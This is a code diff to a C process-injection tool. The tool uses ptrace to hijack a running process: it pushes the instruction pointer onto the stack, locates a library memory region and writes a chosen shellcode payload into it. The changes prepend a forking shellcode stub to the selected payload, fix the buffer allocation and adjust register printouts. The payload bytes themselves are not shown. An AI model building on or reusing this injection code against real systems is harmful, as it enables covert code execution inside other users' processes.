@@ -24,6 +24,7 @@
 // Print usage
 void print_usage(int ret_val)
 {
+    printf("%s\n%s\n", banner, info);
     printf("%s", usage_text);
     exit(ret_val);
 }
@@ -31,11 +32,17 @@ void print_usage(int ret_val)
 // Initialize payload buffer and vars
 void payload_init(void)
 {
-    payload_len = strlen(payloads[args.payload_index].shellcode);
+    fork_shellcode_len = strlen(fork_shellcode);
+    main_shellcode_len = strlen(payloads[args.payload_index].shellcode);
 
-    if(!(sh_buffer = malloc(payload_len))) exit(-1);
+    payload_len = fork_shellcode_len + main_shellcode_len;
 
-    strcpy(sh_buffer, payloads[args.payload_index].shellcode);
+    if(!(sh_buffer = malloc(payload_len + 1))) exit(-1);
+
+    memset(sh_buffer, 0x0, payload_len + 1);
+
+    strcpy(sh_buffer, fork_shellcode);
+    strcat(sh_buffer, payloads[args.payload_index].shellcode);
 }
 
 // Free the payload buffer
@@ -123,17 +130,17 @@ int ptrace_infect()
 
         printf("\n register info: \n");
         printf(" -----------------------------------------------------------\n");
-        printf(" eax is at: 0x%lx\t", reg.AX);
-        printf(" ebx is at: 0x%lx\n", reg.BX);
-        printf(" esp is at: 0x%lx\t", reg.STACK_POINTER);
-        printf(" eip is at: 0x%lx\n", reg.INST_POINTER);
+        printf(" eax value: 0x%lx\t", reg.AX);
+        printf(" ebx value: 0x%lx\n", reg.BX);
+        printf(" esp value: 0x%lx\t", reg.STACK_POINTER);
+        printf(" eip value: 0x%lx\n", reg.INST_POINTER);
         printf(" ------------------------------------------------------------\n\n");
 
-        reg.STACK_POINTER -= BLOCK_SIZE; // decrement STACK_POINTER
+       reg.STACK_POINTER -= BLOCK_SIZE; // decrement STACK_POINTER
 
-        printf("[+] new esp: 0x%.8lx\n", reg.STACK_POINTER);
+       printf("[+] new esp: 0x%.8lx\n", reg.STACK_POINTER);
 
-        ptrace(PTRACE_POKETEXT, pid, reg.STACK_POINTER, reg.INST_POINTER);  // poke INST_POINTER -> STACK_POINTER
+       ptrace(PTRACE_POKETEXT, pid, reg.STACK_POINTER, reg.INST_POINTER);  // poke INST_POINTER -> STACK_POINTER
 
         // get the address for our shellcode
         ptr = beg = search_lib_region(pid, lib_name);
@@ -268,8 +275,6 @@ int parse_arguments(int argc,char **argv)
 // Main function
 int main(int argc,char **argv)
 {
-
-    printf("%s\n%s\n", banner, info);
 
     // parse and check command line arguments
     if ( parse_arguments(argc, argv) == 0 ) {
